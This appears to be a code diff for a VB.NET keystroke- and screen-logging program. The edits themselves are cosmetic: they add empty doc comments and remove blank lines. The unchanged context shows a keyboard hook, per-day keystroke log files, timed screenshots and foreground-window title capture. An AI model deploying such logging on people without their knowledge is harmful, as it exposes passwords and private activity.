@@ -66,6 +66,9 @@ Public Class Main
         End Try
     End Sub
 
+    ''' <summary>
+    ''' 
+    ''' </summary>
     Private Sub SetConfig()
         Try
             Dim srdrMyStreamReader As StreamReader = My.Computer.FileSystem.OpenTextFileReader(CONFIG_FILE)
@@ -106,29 +109,43 @@ Public Class Main
         End If
 
         mstrLogFilePath = mstrFolderPath & "\log.txt"
-
     End Sub
 
+    ''' <summary>
+    ''' 
+    ''' </summary>
     Private Sub onCaptureScreen()
         If Not mblnSessionLocked Then
             CaptureScreen()
         End If
     End Sub
 
+    ''' <summary>
+    ''' 
+    ''' </summary>
     Private Sub onGetCaption()
         If Not mblnSessionLocked Then
             mstrCurrentWindowName = GetCaption()
         End If
     End Sub
 
+    ''' <summary>
+    ''' 
+    ''' </summary>
     Private Sub onShuttingDown(ByVal sender As Object, ByVal e As SessionEndingEventArgs)
         'WriteLog("System shutting down")
     End Sub
 
+    ''' <summary>
+    ''' 
+    ''' </summary>
     Private Sub onShutDown(ByVal sender As Object, ByVal e As SessionEndedEventArgs)
         'WriteLog("System shut down")
     End Sub
 
+    ''' <summary>
+    ''' 
+    ''' </summary>
     Private Sub onCheckLockState(ByVal sender As Object, ByVal e As SessionSwitchEventArgs)
         If e.Reason = SessionSwitchReason.SessionLock Then
             mblnSessionLocked = True
@@ -143,14 +160,23 @@ Public Class Main
         End If
     End Sub
 
+    ''' <summary>
+    ''' 
+    ''' </summary>
     Private Sub mprcProcess_ErrorDataReceived(sender As System.Object, e As System.Diagnostics.DataReceivedEventArgs) Handles mprcProcess.ErrorDataReceived
         WriteLog(e.Data)
     End Sub
 
+    ''' <summary>
+    ''' 
+    ''' </summary>
     Private Sub mprcProcess_OutputDataReceived(sender As System.Object, e As System.Diagnostics.DataReceivedEventArgs) Handles mprcProcess.OutputDataReceived
         WriteLog(e.Data)
     End Sub
 
+    ''' <summary>
+    ''' 
+    ''' </summary>
     Private Sub kbHook_KeyUp(ByVal _strKey As System.Windows.Forms.Keys) Handles kbHook.KeyUp
         Select Case _strKey
             Case 160, 161
@@ -162,6 +188,9 @@ Public Class Main
         End Select
     End Sub
 
+    ''' <summary>
+    ''' 
+    ''' </summary>
     Private Sub kbHook_KeyDown(ByVal _strKey As System.Windows.Forms.Keys) Handles kbHook.KeyDown
         Dim strChar As String = _strKey.ToString.ToLower()
 
@@ -330,6 +359,9 @@ Public Class Main
         End If
     End Sub
 
+    ''' <summary>
+    ''' 
+    ''' </summary>
     Private Sub StartRecording()
         WriteLog("Start Recording")
 
@@ -361,7 +393,9 @@ Public Class Main
         End Try
     End Sub
 
-
+    ''' <summary>
+    ''' 
+    ''' </summary>
     Private Sub StopRecording()
         WriteLog("Stop Recording")
 
@@ -369,6 +403,9 @@ Public Class Main
         mprcProcess.Dispose()
     End Sub
 
+    ''' <summary>
+    ''' 
+    ''' </summary>
     Private Sub CaptureScreen()
         Dim strFileName As String = Date.Now.ToString("HHmmss")
         Dim strFolderName As String = Date.Now.ToString("yyyyMMdd")
@@ -431,6 +468,9 @@ Public Class Main
         End Try
     End Sub
 
+    ''' <summary>
+    ''' 
+    ''' </summary>
     Private Shared Function CaptureCursor(ByRef x As Integer, ByRef y As Integer) As Bitmap
         Dim bmp As Bitmap
         Dim hicon As IntPtr
@@ -451,6 +491,9 @@ Public Class Main
         Return Nothing
     End Function
 
+    ''' <summary>
+    ''' 
+    ''' </summary>
     Private Sub LogKeystroke(ByVal _strKey As String)
         Dim strFileName As String = "log.txt"
         Dim strFolderName As String = Date.Now.ToString("yyyyMMdd")
@@ -511,6 +554,9 @@ Public Class Main
         End Try
     End Sub
 
+    ''' <summary>
+    ''' 
+    ''' </summary>
     Private Function BuildTitle(ByVal _strTitle As String) As String
         Dim strNewString As String = ""
         Dim strUnderline As String = ""
@@ -524,6 +570,10 @@ Public Class Main
         BuildTitle = strNewString & strUnderline & vbCrLf
 
     End Function
+
+    ''' <summary>
+    ''' 
+    ''' </summary>
     Private Function GetUserName()
         GetUserName = Environment.UserName
     End Function
@@ -537,8 +587,9 @@ Public Class Main
     Private Declare Function ShowWindow Lib "user32.dll" (ByVal hwnd As Integer, ByVal nCmdShow As Integer) As Integer
     Private Declare Function MoveWindow Lib "user32.dll" (ByVal hWnd As IntPtr, ByVal x As Integer, ByVal y As Integer, ByVal nWidth As Integer, ByVal nHeight As Integer, ByVal bRepaint As Boolean) As Boolean
 
-    Private makel As String
-
+    ''' <summary>
+    ''' 
+    ''' </summary>
     Private Structure RECT
         Public Left As Integer
         Public Top As Integer
@@ -546,6 +597,9 @@ Public Class Main
         Public Bottom As Integer
     End Structure
 
+    ''' <summary>
+    ''' 
+    ''' </summary>
     Private Function GetCaption() As String
         Dim Caption As New System.Text.StringBuilder(256)
         Dim hWnd As IntPtr = GetForegroundWindow()
@@ -554,6 +608,9 @@ Public Class Main
         Return Mid(Regex.Replace(Caption.ToString(), "[^A-Za-z0-9]", "-"), 1, 128)
     End Function
 
+    ''' <summary>
+    ''' 
+    ''' </summary>
     Private Sub WriteLog(ByVal _strMsg As String)
         Using stwMyStreamWriter As StreamWriter = File.AppendText(mstrLogFilePath)
             'Write the contents to the log file
